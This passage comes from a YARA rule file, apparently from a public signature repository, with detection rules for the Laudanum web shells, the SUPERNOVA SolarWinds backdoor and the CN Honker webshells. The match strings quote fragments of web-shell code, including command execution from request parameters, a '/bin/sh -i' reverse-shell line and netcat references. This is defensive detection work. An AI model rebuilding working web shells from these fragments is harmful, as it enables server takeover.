		$s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
		$s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
		$s3 = "<?php echo exec('killall nc');?>" fullword ascii
		$s4 = "<title>Laudanum Kill nc</title>" fullword ascii
		$s5 = "foreach ($allowedIPs as $IP) {" fullword ascii

	condition:
		filesize <15KB and 4 of them
}
rule SIGNATURE_BASE_Asp_Shell : FILE {
    meta:
		description = "Laudanum Injector Tools - file shell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "3ae27254-325a-5358-b5aa-ab24b43ad5a6"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L47-L66"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8bf1ff6f8edd45e3102be5f8a1fe030752f45613"
		logic_hash = "af9c5cf7125e1210761e720c5f30527ac6345b5029b087807309000a29b67f6e"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii
		$s2 = "%ComSpec% /c dir" fullword ascii
		$s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii
		$s4 = "Server.ScriptTimeout = 180" fullword ascii
		$s5 = "cmd = Request.Form(\"cmd\")" fullword ascii
		$s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
		$s7 = "Dim wshell, intReturn, strPResult" fullword ascii

	condition:
		filesize <15KB and 4 of them
}
rule SIGNATURE_BASE_Settings : FILE {
    meta:
		description = "Laudanum Injector Tools - file settings.php"
		author = "Florian Roth (Nextron Systems)"
		id = "054b8723-fdfa-51dc-91ae-b915e40b2e54"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L68-L83"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "588739b9e4ef2dbb0b4cf630b73295d8134cc801"
		logic_hash = "b02e293e659fa77257d0642c57e51d6ae712d9221ae295cf69bb845f68c650ee"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii
		$s2 = "<li>Reverse Shell - " fullword ascii
		$s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii

	condition:
		filesize <13KB and all of them
}
rule SIGNATURE_BASE_Asp_Proxy : FILE {
    meta:
		description = "Laudanum Injector Tools - file proxy.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "6193b48a-b3da-5c1e-84e8-0035d9e7ade6"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L85-L103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "51e97040d1737618b1775578a772fa6c5a31afd8"
		logic_hash = "f53c97a2bf31f411b3220dc741b85d0edf96e9b92474f1abd5ac443be6b92897"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii
		$s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii
		$s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
		$s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii
		$s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii
		$s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii

	condition:
		filesize <50KB and all of them
}
rule SIGNATURE_BASE_Cfm_Shell : FILE {
    meta:
		description = "Laudanum Injector Tools - file shell.cfm"
		author = "Florian Roth (Nextron Systems)"
		id = "5308eecf-a59f-5100-ab60-5034c5b73e7e"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L105-L120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "885e1783b07c73e7d47d3283be303c9719419b92"
		logic_hash = "961eb398422e3c528b886c150f11dcb8a6832f0ea48e20ddc381e1f2740bd0c6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii
		$s2 = "<cfif ( #suppliedCode# neq secretCode )>" fullword ascii
		$s3 = "<cfif IsDefined(\"form.cmd\")>" fullword ascii

	condition:
		filesize <20KB and 2 of them
}
rule SIGNATURE_BASE_Aspx_Shell : FILE {
    meta:
		description = "Laudanum Injector Tools - file shell.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "d4287007-79af-59fa-b8c8-3ac08d75b3bd"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L122-L138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "076aa781a004ecb2bf545357fd36dcbafdd68b1a"
		logic_hash = "b31c36f53d46e17b6d97e582e46c540928a386e2075b841f5c11b959a0c68462"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "remoteIp = HttpContext.Current.Request.Headers[\"X-Forwarded-For\"].Split(new" ascii
		$s2 = "remoteIp = Request.UserHostAddress;" fullword ascii
		$s3 = "<form method=\"post\" name=\"shell\">" fullword ascii
		$s4 = "<body onload=\"document.shell.c.focus()\">" fullword ascii

	condition:
		filesize <20KB and all of them
}
rule SIGNATURE_BASE_Php_Reverse_Shell : FILE {
    meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "306d150f-95a8-57fd-8f5e-786c429af6b3"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L158-L173"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3ef03bbe3649535a03315dcfc1a1208a09cea49d"
		logic_hash = "ea8e320abb57e0467db92271f7d36f144f85e04ce15cd9fa8d3f53dfa8d43929"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
		$s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
		$s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii

	condition:
		filesize <15KB and all of them
}
rule SIGNATURE_BASE_Php_Dns : FILE {
    meta:
		description = "Laudanum Injector Tools - file dns.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a52e453b-07aa-58b9-91e7-f2426a8e8976"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L175-L191"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
		logic_hash = "650eecc06f215ae6a15078c87d8a8c1597ca9e3d735eacd17b046a9d9deb6aa8"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii
		$s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii
		$s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
		$s4 = "foreach (array_keys($types) as $t) {" fullword ascii

	condition:
		filesize <15KB and all of them
}
rule SIGNATURE_BASE_WEB_INF_Web : FILE {
    meta:
		description = "Laudanum Injector Tools - file web.xml"
		author = "Florian Roth (Nextron Systems)"
		id = "8d0a008c-56d1-59ef-8521-0697add21ba9"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L193-L207"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0251baed0a16c451f9d67dddce04a45dc26cb4a3"
		logic_hash = "b58bb63a5268812ed6a5d18c8da96b0fdae33e4802a2fba4964ab69e92517a16"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<servlet-name>Command</servlet-name>" fullword ascii
		$s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii

	condition:
		filesize <1KB and all of them
}
rule SIGNATURE_BASE_Jsp_Cmd : FILE {
    meta:
		description = "Laudanum Injector Tools - file cmd.war"
		author = "Florian Roth (Nextron Systems)"
		id = "74db62b8-82d5-5a34-aa72-2f85053715a4"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L209-L226"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "55e4c3dc00cfab7ac16e7cfb53c11b0c01c16d3d"
		logic_hash = "ab5b013a385549322bcb2811fa1a2d14b5633e2c41b9486b1e1c50c02437b8e6"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cmd.jsp}" fullword ascii
		$s1 = "cmd.jspPK" fullword ascii
		$s2 = "WEB-INF/web.xml" fullword ascii
		$s3 = "WEB-INF/web.xmlPK" fullword ascii
		$s4 = "META-INF/MANIFEST.MF" fullword ascii

	condition:
		uint16(0)==0x4b50 and filesize <2KB and all of them
}
rule SIGNATURE_BASE_Laudanum : FILE {
    meta:
		description = "Laudanum Injector Tools - file laudanum.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8c836aba-3644-5914-a3ff-937d0a6cd378"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L228-L242"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fd498c8b195967db01f68776ff5e36a06c9dfbfe"
		logic_hash = "53caad87d22b5f13e5b7be8720baa1d436cc57d8062ec5d557df8524a2ccfb68"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "public function __activate()" fullword ascii
		$s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii

	condition:
		filesize <5KB and all of them
}
rule SIGNATURE_BASE_Php_File : FILE {
    meta:
		description = "Laudanum Injector Tools - file file.php"
		author = "Florian Roth (Nextron Systems)"
		id = "68456891-6828-5e42-b8a0-67ecaf83cdc0"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L244-L260"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7421d33e8007c92c8642a36cba7351c7f95a4335"
		logic_hash = "85c14a9c8a6aece231b1cb6dcdd7ed39fdc6aced868c34557ee2e2204ce7007b"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$allowedIPs =" fullword ascii
		$s2 = "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>" fullword ascii
		$s3 = "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";" fullword ascii
		$s4 = "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";" fullword ascii

	condition:
		filesize <10KB and all of them
}
rule SIGNATURE_BASE_Warfiles_Cmd : FILE {
    meta:
		description = "Laudanum Injector Tools - file cmd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "f974255b-cfbe-57b0-af1f-eddb7f12f5ed"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L262-L278"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3ae3d837e7b362de738cf7fad78eded0dccf601f"
		logic_hash = "64724b24d9f5b5d78e231ea8196abb609237cc430c49f6ceeb99c9684a904568"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii
		$s2 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii
		$s3 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
		$s4 = "String disr = dis.readLine();" fullword ascii

	condition:
		filesize <2KB and all of them
}
rule SIGNATURE_BASE_Asp_Dns : FILE {
    meta:
		description = "Laudanum Injector Tools - file dns.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "b0e30ca0-7163-5731-98c5-5a1893b8ea80"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L280-L296"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5532154dd67800d33dace01103e9b2c4f3d01d51"
		logic_hash = "808e879238a0c24e975c260fc95c05c91bdc0f73553a241bd00f5bf7e6622639"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "command = \"nslookup -type=\" & qtype & \" \" & query " fullword ascii
		$s2 = "Set objCmd = objWShell.Exec(command)" fullword ascii
		$s3 = "Response.Write command & \"<br>\"" fullword ascii
		$s4 = "<form name=\"dns\" method=\"POST\">" fullword ascii

	condition:
		filesize <21KB and all of them
}
rule SIGNATURE_BASE_Php_Reverse_Shell_2 : FILE {
    meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f10cc33e-0cb6-5d08-af1f-5ef76368de9d"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L298-L312"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "025db3c3473413064f0606d93d155c7eb5049c42"
		logic_hash = "695dc565c273ed358f7d56526fa4956ba13b216d8897d0707e1660a82b745081"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
		$s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii

	condition:
		filesize <10KB and all of them
}
rule SIGNATURE_BASE_Laudanum_Tools_Generic : FILE {
    meta:
		description = "Laudanum Injector Tools"
		author = "Florian Roth (Nextron Systems)"
		id = "15738788-5f34-54d0-92fe-f7024c998a54"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_laudanum_webshells.yar#L314-L345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "52c6d3be4fc91e8a61645886fa89bf78eddad51960702ff2ac83ec01d5d529ef"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "076aa781a004ecb2bf545357fd36dcbafdd68b1a"
		hash1 = "885e1783b07c73e7d47d3283be303c9719419b92"
		hash2 = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
		hash3 = "7421d33e8007c92c8642a36cba7351c7f95a4335"
		hash4 = "f49291aef9165ee4904d2d8c3cf5a6515ca0794f"
		hash5 = "c0dee56ee68719d5ec39e773621ffe40b144fda5"
		hash6 = "f32b9c2cc3a61fa326e9caebce28ef94a7a00c9a"
		hash7 = "dc5c03a21267d024ef0f5ab96a34e3f6423dfcd6"
		hash8 = "fd498c8b195967db01f68776ff5e36a06c9dfbfe"
		hash9 = "b50ae35fcf767466f6ca25984cc008b7629676b8"
		hash10 = "5570d10244d90ef53b74e2ac287fc657e38200f0"
		hash11 = "42bcb491a11b4703c125daf1747cf2a40a1b36f3"
		hash12 = "83e4eaaa2cf6898d7f83ab80158b64b1d48096f4"
		hash13 = "dec7ea322898690a7f91db9377f035ad7072b8d7"
		hash14 = "a2272b8a4221c6cc373915f0cc555fe55d65ac4d"
		hash15 = "588739b9e4ef2dbb0b4cf630b73295d8134cc801"
		hash16 = "43320dc23fb2ed26b882512e7c0bfdc64e2c1849"

	strings:
		$s1 = "***  laudanum@secureideas.net" fullword ascii
		$s2 = "*** Laudanum Project" fullword ascii

	condition:
		filesize <60KB and all of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Xsltransform_Aug21 : FILE {
    meta:
		description = "Detects an ASPX webshell utilizing XSL Transformations"
		author = "Max Altgelt"
		id = "44254084-a717-59e6-a3ac-eca3c1c864a8"
		date = "2020-02-23"
		modified = "2023-12-05"
		reference = "https://gist.github.com/JohnHammond/cdae03ca5bc2a14a735ad0334dcb93d6"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/webshell_xsl_transform.yar#L1-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "3ac0b50adc4c56769d0248e213e9426a22e0f5086bf081da57f835ff1c77b716"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$csharpshell = "Language=\"C#\"" nocase
		$x1 = "<root>1</root>"
		$x2 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("
		$s1 = "XsltSettings.TrustedXslt"
		$s2 = "Xml.XmlUrlResolver"
		$s3 = "FromBase64String(Request[\""

	condition:
		filesize <500KB and $csharpshell and (1 of ($x*) or all of ($s*))
}
rule SIGNATURE_BASE_APT_Webshell_SUPERNOVA_1 : FILE {
    meta:
		description = "SUPERNOVA is a .NET web shell backdoor masquerading as a legitimate SolarWinds web service handler. SUPERNOVA inspects and responds to HTTP requests with the appropriate HTTP query strings, Cookies, and/or HTML form values (e.g. named codes, class, method, and args). This rule is looking for specific strings and attributes related to SUPERNOVA."
		author = "FireEye"
		id = "73a27fa2-a846-5f4b-8182-064ac06c71a8"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_solarwinds_sunburst.yar#L80-L99"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "8471e6b3675e7e9ccfe5b81ab4c599668f2de528f3b179a675f50aa1fd7814b2"
		score = 85
		quality = 81
		tags = "FILE"

	strings:
		$compile1 = "CompileAssemblyFromSource"
		$compile2 = "CreateCompiler"
		$context = "ProcessRequest"
		$httpmodule = "IHttpHandler" ascii
		$string1 = "clazz"
		$string2 = "//NetPerfMon//images//NoLogo.gif" wide
		$string3 = "SolarWinds" ascii nocase wide

	condition:
		uint16(0)==0x5a4d and uint32( uint32(0x3C))==0x00004550 and filesize <10KB and pe.imports("mscoree.dll","_CorDllMain") and $httpmodule and $context and all of ($compile*) and all of ($string*)
}
rule SIGNATURE_BASE_APT_Webshell_SUPERNOVA_2 : FILE {
    meta:
		description = "This rule is looking for specific strings related to SUPERNOVA. SUPERNOVA is a .NET web shell backdoor masquerading as a legitimate SolarWinds web service handler. SUPERNOVA inspects and responds to HTTP requests with the appropriate HTTP query strings, Cookies, and/or HTML form values (e.g. named codes, class, method, and args)."
		author = "FireEye"
		id = "c39bf9ba-fd62-5619-92b6-1633375ef197"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_solarwinds_sunburst.yar#L100-L118"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "96e344bd2ba3ee07784852db3e9935352762c2fa7b6be88f00cac10a90706ffc"
		score = 85
		quality = 83
		tags = "FILE"

	strings:
		$dynamic = "DynamicRun"
		$solar = "Solarwinds" nocase
		$string1 = "codes"
		$string2 = "clazz"
		$string3 = "method"
		$string4 = "args"

	condition:
		uint16(0)==0x5a4d and uint32( uint32(0x3C))==0x00004550 and filesize <10KB and 3 of ($string*) and $dynamic and $solar
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php5 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php5.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "ee063c4c-af06-520f-acfe-fba758b84d3c"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L8-L23"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0fd91b6ad400a857a6a65c8132c39e6a16712f19"
		logic_hash = "e882f115a67fe31ece1a81e1a2770b46370a92ac3aa23e348a12cdb5735e8a0e"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user" ascii
		$s20 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$" ascii

	condition:
		uint16(0)==0x3f3c and filesize <300KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Test3693 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file test3693.war"
		author = "Florian Roth (Nextron Systems)"
		id = "58fe4445-b2e1-5d5f-8c46-39c6ae78f845"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L25-L40"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "246d629ae3ad980b5bfe7e941fe90b855155dbfc"
		logic_hash = "a10618d54fb7adbbd89a10f2e1ac067ccd1832140bcaf3b92394ebe7323f2d1e"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
		$s2 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - " ascii

	condition:
		uint16(0)==0x4b50 and filesize <50KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Mycode12 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file mycode12.cfm"
		author = "Florian Roth (Nextron Systems)"
		id = "2ce7368c-7565-5b32-94d1-c87023404c5b"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L42-L57"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "64be8760be5ab5c2dcf829e3f87d3e50b1922f17"
		logic_hash = "94cb0e414634af753db9ec0c63a3a34b4f9104e93e01d67cebab7b3a0c471198"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<cfexecute name=\"cmd.exe\"" fullword ascii
		$s2 = "<cfoutput>#cmd#</cfoutput>" fullword ascii

	condition:
		filesize <4KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Offlibrary : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file offlibrary.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c01f7c8b-a6bd-5094-9574-8cc853698607"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L59-L74"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "eb5275f99211106ae10a23b7e565d208a94c402b"
		logic_hash = "ffec24bedfe0794e8f92da5067c41932339e61ec23d71a67ed4b634434cd10d6"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "';$i=$g->query(\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING" ascii
		$s12 = "if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju" ascii

	condition:
		filesize <1005KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Cfm_Xl : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file xl.cfm"
		author = "Florian Roth (Nextron Systems)"
		id = "5c8d1301-fe20-50e0-86ac-99a220cd4be1"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L76-L91"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "49c3d16ee970945367a7d6ae86b7ade7cb3b5447"
		logic_hash = "b6683a24ad58a9444ec91f13e7da5db3e3e768afded09a23e1bbd0a0c23cf6b9"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input name=\"DESTINATION\" value=\"" ascii
		$s1 = "<CFFILE ACTION=\"Write\" FILE=\"#Form.path#\" OUTPUT=\"#Form.cmd#\">" fullword ascii

	condition:
